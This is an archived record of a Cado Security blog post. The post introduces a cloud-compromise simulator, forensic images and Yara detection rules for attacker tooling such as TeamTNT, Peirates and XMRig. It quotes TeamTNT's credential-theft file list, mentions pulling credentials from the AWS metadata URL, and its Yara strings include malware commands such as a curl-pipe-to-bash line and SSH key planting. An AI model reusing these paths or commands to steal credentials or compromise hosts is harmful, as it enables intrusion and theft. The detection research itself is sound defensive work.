{
    "id": "ba0daba3-7a15-4dcd-a43d-a1390b7d422b",
    "created_at": "2023-01-12T15:06:06.260132Z",
    "updated_at": "2025-03-27T02:17:01.065329Z",
    "deleted_at": null,
    "sha1_hash": "411b80582b81c4b5f2a5162ee49ae3e406260ee3",
    "title": "2021-07-13 - Resources for Investigating Cloud and Container Penetration Testing Tools",
    "authors": "",
    "file_creation_date": "2022-05-27T23:22:57Z",
    "file_modification_date": "2022-05-27T23:22:57Z",
    "file_size": 566962,
    "plain_text": "# Resources for Investigating Cloud and Container Penetration Testing Tools\n\n**[cadosecurity.com/post/resources-for-investigating-cloud-and-container-penetration-testing-tools](https://www.cadosecurity.com/post/resources-for-investigating-cloud-and-container-penetration-testing-tools)**\n\n## Blog\n\n July 13, 2021\n\n\nJuly 13, 2021\n\n\n## Cloud and container penetration testing tools are frequently used by real-world attackers. Some of these toolsets are quite innovative, giving adversaries an edge.\n\n As part of this blog, we’ve released three resources:\n\n CloudAndContainerCompromiseSimulator – This tool makes a Linux system appear as though it has been victim of a cloud / container-specific attack, while eliminating the inherent risk of running actual live malware in your environment. It is inspired by both malware we have seen previously, and Florian Roth’s APTSimulator tool. Forensic disk images of an Amazon Linux and Amazon Ubuntu system after running CloudCompromiseSimulator against them – These may be useful for testing forensic investigations in cloud and container systems. Note: we have deleted the AWS account that this data is associated with.\n\n\n-----\n\n## Yara rules – These rules can be used to detect these attacks.\n\n Executing CloudAndContainerCompromiseSimulator This script is designed to be very quick to deploy as it doesn’t require the installation of agents or installing servers.\n\n Copy the files to the system with:\n```\ngit clone https://github.com/cado-security/CloudAndContainerCompromiseSimulator.git\n\n or\nwget https://github.com/cadosecurity/CloudAndContainerCompromiseSimulator/archive/refs/heads/main.zip\n\n Then execute with:\nchmod +x ./setup.sh\n./setup.sh\n\n The script deploys a number of tools during its execution, almost all of which we’ve seen real-world attackers deploy:\n\n Below we’ve outlined some of the capabilities we’ve seen attackers deploy from these toolsets:\n\n Key Theft The most complete individual key theft tool we’ve seen is from TeamTNT, which steals keys from a surprisingly large number of tools:\nFULL_ARRAY=(\"/etc/passwd-s3fs\" \"/etc/davfs2/secrets\"\n\"/etc/zypp/credentials.d/NCCcredentials\" \"/etc/cloudflared/config.yml\"\n\"/etc/eksctl/metadata.env\")\nPATH_ARRAY=(\".ssh/id_rsa\" \".ssh/id_rsa.pub\" \".ssh/known_hosts\" \".ssh/config\"\n\".ssh/authorized_keys\" \".ssh/authorized_keys2\" \\\n \".aws/config\" \".aws/credentials\" \".aws/credentials.gpg\" \".docker/config.json\"\n\".docker/ca.pem\" \".s3backer_passwd\" \"s3proxy.conf\" \\\n \".s3ql/authinfo2\" \".passwd-s3fs\" \".s3cfg\" \".git-credentials\" \".gitconfig\"\n\".shodan/api_key\" \".ngrok2/ngrok.yml\" \".purple/accounts.xml\" \\\n \".config/filezilla/filezilla.xml\" \".config/filezilla/recentservers.xml\"\n\".config/hexchat/servlist.conf\" \".config/monero-project/monero-core.conf\" \\\n \".boto\" \".netrc\" \".config/gcloud/access_tokens.db\" \".config/gcloud/credentials.db\"\n\".davfs2/secrets\" \".pgpass\" \".local/share/jupyter/runtime/notebook_cookie_secret\" \\\n \".smbclient.conf\" \".smbcredentials\" \".samba_credentials\")\n\n We’ve also seen a number of other cloud penetration testing tools deployed by attackers to steal keys including Peirates, Scout Suite and even Infection Monkey. Oddly, whilst we’ve seen many targeting AWS and GCloud credentials files, we’ve yet to see a real-world attack that specifically steals Azure credentials.\n\n```\n\n-----\n\n## MetaData URLs Many of the tools also scrape meta-data URLs for credentials to enable lateral movement. In AWS, this means connecting to URLs such as http://169.254.169.254/latest/meta- data/iam/security-credentials/ and exfiltrating the output.\n\n Spreading and Container Escapes Most of the worms we’ve seen simply scan for completely open Kubernetes and Docker APIs and then spread by spinning up new infected worker containers.\n\n Monero Mining This isn’t strictly cloud or container specific, but it is the end goal of many attacks against cloud infrastructure, so we thought it was worth including in the simulator.\n\n Detection Cado provides a number of detections and the ability to hunt for usage of these tools in our cloud forensics platform, Cado Response (screenshots below). We have released Yara rules for the detections of the tools themselves under a friendly Apache 2.0 License.\n\n\n-----\n\n## Yara Rules\n\n\n-----\n\n```\n/\n A rule-set for tools commonly seen in cloud and container intrusions\n*/\nrule cloud_mining_worm {\n  meta:\n   description = \"Detects Common Cloud Mining Worms\"\n   author = \"[email protected]\"\n   date = \"2020-08-16\"\n   license = \"Apache License 2.0\"\n   hash1 = \"3a377e5baf2c7095db1d7577339e4eb847ded2bfec1c176251e8b8b0b76d393f\"\n   hash2 = \"929c3017e6391b92b2fbce654cf7f8b0d3d222f96b5b20385059b584975a298b\"\n   hash3 = \"705a22f0266c382c846ee37b8cd544db1ff19980b8a627a4a4f01c1161a71cb0\"\n  strings:\n   $a = \"echo $LOCKFILE | base64 -d > $tmpxmrigfile\" wide ascii\n   $b = \"/root/.tmp/xmrig –config=/root/.tmp/\" wide ascii\n   $c = \"if [ -s /usr/bin/curl ]; then\" wide ascii\n   $d = \"echo ‘found: /root/.aws/credentials'\" wide ascii\n   $e = \"function KILLMININGSERVICES(){\" wide ascii\n   $g = \"touch /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null\" wide ascii\n   $h = \"rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service\" wide ascii\n   $i = \"[email protected]/root/.ssh/id_ed25519.pub\" wide ascii\n   $j = \"echo '0' >/proc/sys/kernel/nmi_watchdog\" wide ascii\n   $k = \"curl http://update.aegis.aliyun.com/download/uninstall.sh | bash\" wide\nascii\n   $l = \"rm -f /var/tmp/kinsing\" wide ascii\n  condition:\n   filesize < 500KB and any of them\n}\nrule cryptomining_malware_xmrig_config {\n  meta:\n   description = \"Detects XMRig Config File\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"1085c9211f2af8ddf1588adfb150c64c2b3a2b1c7acf4bc445546455f36299c0\"\n  strings:\n   $ = \"\\\"cpu-affinity\\\"\" nocase wide ascii\n   $ = \"\\\"autosave\\\"\" nocase wide ascii\n   $ = \"\\\"log-file\\\"\" nocase wide ascii\n   $ = \"\\\"max-cpu-usage\\\"\" nocase wide ascii\n   $ = \"\\\"donate-level\\\"\" nocase wide ascii\n   $ = \"\\\"huge-pages\\\"\" nocase wide ascii\n   $ = \"\\\"cpu-priority\\\"\" nocase wide ascii\n  condition:\n\n```\n\n-----\n\n```\n   filesize < 500KB and 5 of them\n}\nrule cryptomining_malware_xmrig {\n  meta:\n   description = \"Detects XMRig\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"a34ae92c904b60ed7c1dc437493d1b086a828d25c52e5409d2c7b79b880db42f\"\n  strings:\n   $ = \"password for mining server\" nocase wide ascii\n   $ = \"threads count to initialize RandomX dataset\" nocase wide ascii\n   $ = \"display this help and exit\" nocase wide ascii\n   $ = \"maximum CPU threads count (in percentage) hint for autoconfig\" nocase wide\nascii\n   $ = \"enable CUDA mining backend\" nocase wide ascii\n   $ = \"cryptonight\" nocase wide ascii\n  condition:\n   5 of them\n}\nrule pentest_tool_peirates {\n  meta:\n   description = \"Detects Peirates\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"a0418d568cfe788fe3d2d0558d70fb6d0e7769a2314c58ca04b57cc3225fe532\"\n  strings:\n   $ = \"/var/run/secrets/kubernetes.io/serviceaccount/\" nocase wide ascii\n   $ = \"List of comma-seperated Pods\" nocase wide ascii\n   $ = \"github.com/aws/aws-sdk-go/service/s3\" nocase wide ascii\n   $ = \"S3).ListBucketsRequest\" nocase wide ascii\n  condition:\n   all of them\n}\nrule pentest_tool_kubeletmein {\n  meta:\n   description = \"Detects kubeletmein\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"112709845dc4ba4edd55747b871542f98ab0307fc8b812fffd5c2a7c3b0801f7\"\n  strings:\n   $ = \"github.com/4armed/kubeletmein\" nocase wide ascii\n   $ = \"unable to write kubeconfig file\" nocase wide ascii\n   $ = \"now try: kubectl --kubeconfig\" nocase wide ascii\n   $ = \"EC2Metadata request\" nocase wide ascii\n  condition:\n   all of them\n\n```\n\n-----\n\n```\n}\nrule pentest_tool_dopwn {\n  meta:\n   description = \"Detects dopwn\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"6fae4c6c34478fb515b8510d14071fc955a13e6bfb93121220342fec866317d1\"\n  strings:\n   $ = \"grab the digitalocean secret and take over the DO account too\" nocase wide\nascii\n   $ = \"registry/clusterrolebindings\" nocase wide ascii\n   $ = \"k8s-ca-cert\" nocase wide ascii\n  condition:\n   all of them\n}\nrule pentest_tool_deepce {\n  meta:\n   description = \"Detects DeepCE\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"\"\n  strings:\n   $ = \"should be used for authorized penetration testing\" nocase wide ascii\n   $ = \"Docker Enumeration, Escalation of Privileges and Container Escapes\" nocase\nwide ascii\n   $ = \"Are we inside kubenetes?\" nocase wide ascii\n   $ = \"ip route get 1 | head -1\" nocase wide ascii\n  condition:\n   all of them\n}\nrule pentest_tool_botb {\n  meta:\n   description = \"Detects Break Out The Box\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"3aae4a2bf41aedaa3b12a2a97398fa89a9818b4bec433c20b4e724505277af83\"\n  strings:\n   $ = \"github.com/brompwnie/botb\" wide ascii\n   $ = \"/Users/cleroy/go/src\" wide ascii\n   $ = \"Data uploaded to\" wide ascii\n   $ = \"Break Out The Box\" wide ascii\n  condition:\n   all of them\n}\nrule suspicious_cloud_credentials {\n\n```\n\n-----\n\n```\n  meta:\n   description = \"Detects file containing a number of cloud credentials\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"b58cf43cb4b000cb63334a8e20ca53e0112037daa178062c876a395092e1d8ca\"\n  strings:\n   $ = \".aws/credentials\" nocase wide ascii\n   $ = \".config/gcloud/access_tokens.db\" nocase wide ascii\n   $ = \".azure/credentials\" nocase wide ascii\n  condition:\n   all of them\n}\nrule pentest_tool_amicontained {\n  meta:\n   description = \"Detects amicontained\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"d8c49e2cf44ee9668219acd092ed961fc1aa420a6e036e0822d7a31033776c9f\"\n  strings:\n   $ = \"github.com/genuinetools/amicontained\" wide ascii\n   $ = \"CFeDIY4Rq5cFO8K/uqDblHUxjlzOmjFpvRg=\" wide ascii\n   $ = \"cpu.processOptions\" wide ascii\n   $ = \"runtime.sendDirect\" wide ascii\n  condition:\n   all of them\n}\nrule pentest_tool_pillreg {\n  meta:\n   description = \"Detects go-pillage-registries\"\n   author = \"[email protected]\"\n   date = \"2021-06-28\"\n   license = \"Apache License 2.0\"\n   hash1 = \"\"\n  strings:\n   $ = \"pillage.ImageData\" nocase wide ascii\n   $ = \"pillage.StorageOptions\" nocase wide ascii\n   $ = \"go-pillage-registries\" nocase wide ascii\n   $ = \"pillage.EnumRegistry\" nocase wide ascii\n  condition:\n   all of them\n}\n\n## About The Author\n\n```\n\n-----\n\n## Chris Doman\n\n Chris is well known for building the popular threat intelligence portal ThreatCrowd, which subsequently merged into the AlienVault Open Threat Exchange, later acquired by AT&T. Chris is an industry leading threat researcher and has published a number of widely read articles and papers on targeted cyber attacks. His research on topics such as the North Korean government’s crypto-currency theft schemes, and China’s attacks against dissident websites, have been widely discussed in the media. He has also given interviews to print, radio and TV such as CNN and BBC News.\n\n About Cado Security\n\n Cado Security provides the cloud investigation platform that empowers security teams to respond to threats at cloud speed. By automating data capture and processing across cloud and container environments, Cado Response effortlessly delivers forensic-level detail and unprecedented context to simplify cloud investigation and response. Backed by Blossom Capital and Ten Eleven Ventures, Cado Security has offices in the United States and United Kingdom. For more information, please visit https://www.cadosecurity.com/ or follow us on Twitter @cadosecurity.\n\n Prev Post Next Post\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-13 - Resources for Investigating Cloud and Container Penetration Testing Tools.pdf"
    ],
    "report_names": [
        "2021-07-13 - Resources for Investigating Cloud and Container Penetration Testing Tools.pdf"
    ],
    "threat_actors": [
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535966,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653693777,
    "ts_modification_date": 1653693777,
    "files": {
        "pdf": "https://archive.orkl.eu/411b80582b81c4b5f2a5162ee49ae3e406260ee3.pdf",
        "text": "https://archive.orkl.eu/411b80582b81c4b5f2a5162ee49ae3e406260ee3.txt",
        "img": "https://archive.orkl.eu/411b80582b81c4b5f2a5162ee49ae3e406260ee3.jpg"
    }
}